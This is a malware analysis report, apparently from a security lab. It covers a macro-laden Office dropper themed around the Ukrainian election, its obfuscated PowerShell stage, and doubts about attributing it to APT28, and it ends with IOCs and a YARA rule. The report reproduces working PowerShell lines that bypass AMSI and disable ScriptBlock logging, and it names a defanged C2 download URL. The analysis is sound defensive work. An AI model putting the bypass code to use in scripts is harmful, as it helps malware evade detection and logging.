@@ -1,0 +1,81 @@
+Introduction
+In mid-March, a suspicious Office document referencing the Ukraine elections appeared in the wild. This file was uncommon, it seemed carefully prepared and was speaking about who is leading in the elections polls, arguing about the life of the favorite candidate, Volodymyr Zelenskiy, who is defined Servant of the People, along with a strong headline referencing conflicts between Ukraine and Russia. A copy of the Daily Express’ article published back in February.
+This document actually is the first step of a more complex cyber attack.
+
+Figure 1: Overview of the malicious document
+
+The particular theme and its detection timing attracted our attention, so we decided to dig further to assess the nature of this malicious document.
+Technical Analysis
+
+Sha256 8a35b6ecdf43f42dbf1e77235d6017faa70d9c68930bdc891d984a89d895c1e7
+
+Threat Document dropper
+
+Brief Description
+
+The first peculiarity of the malicious document is the protected macro, in fact, when the user tries to read it immediately shows a message box asking for password. This Office password protection could be easily bypassed using the classic malware analysis tools and after the code extraction, it’s possible to analyze the plain-text code as follows.  Figure 2: password required to view and modify macros on document
+
+Figure 3: source code of the document macro
+
+At first glance there is no trace of obfuscated code, but an anomalous function invocation could be spotted into the macro:
+ActiveDocument.BuiltInDocumentProperties.Item(“Company”).This method allows to recover a property belonging to the document metadata. In the specific case, the code tries to read the value contained within the “Company” property, which is embedding a base64 encoded string.
+
+Figure 4: Payload stored in “Company” tag of document metadata
+
+The usage of document properties section to hide the malicious payload has also been used by the Emotet banking malware, one of the most aggressive malware threats against companies and users all around the world. Anyway, unlike the initial code, the decoded payload revealed a highly obfuscated Powershell command.
+
+Figure 5: powershell code after base64 to ascii conversion
+
+After several deobfuscation stages, the clear code is the following:
+
+Figure 6: clear powershell code
+
+This script is quite interesting because its first action aims to lower its fingerprint: it disables the Powershell ScriptBlock logging and the Antimalware Scan Interface (AMSI).
+The ScriptBlock logging feature was introduced in Powershell v5 and is able to log blocks of code as they are executed by the PowerShell engine, including obfuscated snippet and the correspondent deobfuscated one. AMSI, instead, is a versatile interface standard that allows applications and services to integrate with any anti-malware product installed on a machine, allowing them to evaluate code just prior to its execution, possibly after the payload de-obfuscation. Further detail about AMSI have been described in a previous analysis report.
+So, the malware checks the current Powershell version: if it is greater or equal than 3, it disables the above mentioned security features. Both the features are bypassed using a few lines of code. The ScriptBlock logging can be disabled through the following instructions:
+1.  $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+2.  $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
+3.  $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
+And the AMSI bypass code, instead, is even simpler:
+1.  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)<br>
+This instruction is able to modify the value of “amsiInitFailed” variable, setting it to “true”. In this way, when the “ScanContent” method uses the variable to determine if AMSI should scan the command to be executed, it returns the AMSI_RESULT_NOT_DETECTED value and lets the payload run. Investigating these techniques, it seems the malware writer has taken inspiration from this article to implement these functionalities. The blog post, in fact, explains both AMSI and BlockLogging disabling techniques.
+At this point, the powershell code tries to download the next infection stage from “hxxps://functiondiscovery[.]net:8443/admin/get.php”, after setting up the InternetExplorer 11 User-Agent to stay under the radar. This code also includes a Powershell Empire characteristic indicator: the cookie “session=J+kcj5bWE11g4zBLrjvZjNO296I=”.
+Figure 7: user agent set by malware
+
+The network communication ends up into a command and control address is located in Czech Republic. This IP is was first seen on October 2018 and was active until April 2019.
+Figure 8: information about DropURL/C2
+
+A Problematic Attribution
+The portion of script contacting the C2 server are created using the popular post-exploitation tool Empire and some Sofacy samples already analyzed by other firms used Empire-generated script as post-exploitation module. Moreover, according to FireEye’s analysis about the Russian hacker groups, APT28 is “increasing its reliance on public code repositories, such as Carberp, PowerShell Empire, P.A.S. webshell, Metasploit modules and others, likely to accelerate their development cycle and provide plausible deniability”.
+APT28 (aka Fancy Bear, Pawn Storm, Sofacy Group, Sednit, and STRONTIUM) launched several attacks on democratic institutions in Europe between September and December 2018. The group has been active since at least 2007 and it has targeted governments, militaries, and security organizations worldwide. They were involved also in the string of attacks that targeted 2016 Presidential election.
+According to a report published by Symantec in October, the group was actively conducting cyber espionage campaigns against government and military organizations in Europe and South America. Starting in 2017 and continuing into 2018, the APT28 group returned to covert intelligence gathering operations in Europe and South America.
+Anyway, the capabilities of the analyzed sample makes some confusion about the attribution. As previously mentioned, in fact, the document’s content is not obfuscated in any way: the user can read the entire article about Ukraine elections, so why should he enable the macros? Moreover, also the macro code is totally readable without the usage of encryption or obfuscation to evade detection. The only macro protection mechanism consists in locking dev project from viewing through password, but it is easily bypassable using the classic malware analysis tools. All these elements are not too characteristics of the canonical APT28 droppers, in which the heavy obfuscation has been traditionally adopted. SecurityArtWork team, in their analysis, hypothesize the sample belongs to Sofacy group due to similarities between an older sample (8cccdce85beca7b7dc805a7f048fcd1bc8f7614dd7e13c2986a9fa5dfbbbbdf9) studied by Vitali Kremez. The researchers team highlighted the likeness between the functions names used into the macro code and the usage of WMI connector to start a new malicious process.
+However, analyzing both the documents, the macros do not show the same structure even if the name of some functions are equals. In the right figure, corresponding to the sample analyzed by Vitali Kremez, the code is quite obfuscated: it includes “$” character to evade AVs and a custom base64 routine to perform decoding.
+Figure 9: Macro comparison: newer sample (left) vs older sample (right)
+
+The part of macro in which WMI is invoked corresponds to a trick used to bypass Microsoft ASR (Attack Surface Reduction) and launch a new process from Office applications. This trick, and the used code, is not directly related to the Russian group due to the fact that similar code snippets are publicly available on Github. So the similarity of the macro code between the documents substantially rely on this open-source code reuse.
+Conclusion
+We are not fully confident of this attribution, so we are investigating other recent samples related to the Sofacy group to better explore their possible interest in influencing political elections.
+Stay Tuned.
+Indicator of Compromise
+C2:
+hxxps://functiondiscovery[.]net
+Hash:
+e259df89e065c4162b273ebb18b75ea153f9bafe30a8c6610204ccf5e3f4ebcd
+
+Yara Rules
+1.  rule possible_APT28_ukraine_election_document {
+2.  meta:
+3.    description = "Yara rule for ukraine_election_document"
+4.    author = "Cybaze – Yoroi ZLab"
+5.    last_updated = "2019-04-10"
+6.    tlp = "white"
+7.    category = "informational"
+8.  strings:
+9.    $a1 = {F6 EC 18 27 58 C5 1E CB 36 B0 79}
+10.    $a2 = {50 4B 03 04 14 00 06}
+11.    $b = "[Content_Types].xml"
+12.
+13.  condition:
+14.    all of them
+15.  }
